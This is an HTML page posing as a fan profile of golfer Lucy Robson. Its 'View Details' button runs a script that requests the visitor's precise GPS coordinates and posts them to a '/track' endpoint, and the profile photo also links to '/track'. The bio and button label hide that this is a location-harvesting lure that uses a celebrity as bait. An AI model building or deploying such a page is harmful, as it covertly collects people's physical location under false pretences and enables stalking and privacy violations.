<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lucy Robson - Golf Star</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">

    <div class="bg-white shadow-lg rounded-lg overflow-hidden max-w-lg w-full">
        <a href="/track">
            <img src="/image.png" alt="Lucy Robson" class="w-full h-full object-cover">
        </a>
        
        <div class="p-6 text-center">
            <h1 class="text-3xl font-bold text-gray-800">Lucy Robson</h1>
            <p class="text-gray-600 mt-2">Professional Golf Player & Social Media Personality</p>

            <p class="text-gray-700 mt-4">
                Lucy Robson is a talented golfer known for her skills on the course and growing influence in the golf community. 
                She has gained a strong following through her love for the game and engaging content.
            </p>

            <button id="trackButton" class="mt-6 px-6 py-3 bg-blue-600 text-white font-semibold rounded-lg shadow-md 
                hover:bg-blue-700 transition">
                View Details
            </button>

            <p id="statusMessage" class="mt-4 text-gray-600"></p>
        </div>
    </div>

    <script>
        document.getElementById("trackButton").addEventListener("click", async () => {
            const statusMessage = document.getElementById("statusMessage");
            statusMessage.innerText = "🔄 Tracking in progress...";

            // Function to send tracking data to the server
            async function sendTrackingData(clientLocation = null) {
                try {
                    const response = await fetch("/track", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ clientLocation })
                    });

                    if (response.ok) {
                        statusMessage.innerText = "✅ Data tracked successfully!";
                    } else {
                        statusMessage.innerText = "❌ Tracking failed!";
                    }
                } catch (error) {
                    statusMessage.innerText = "❌ Error: Unable to send request.";
                }
            }

            // Try to get GPS location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const clientLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        sendTrackingData(clientLocation);
                    },
                    (error) => {
                        console.error("GPS Error:", error);
                        sendTrackingData(); // Send request without GPS
                    }
                );
            } else {
                sendTrackingData(); // If GPS is not supported
            }
        });
    </script>

</body>
</html>
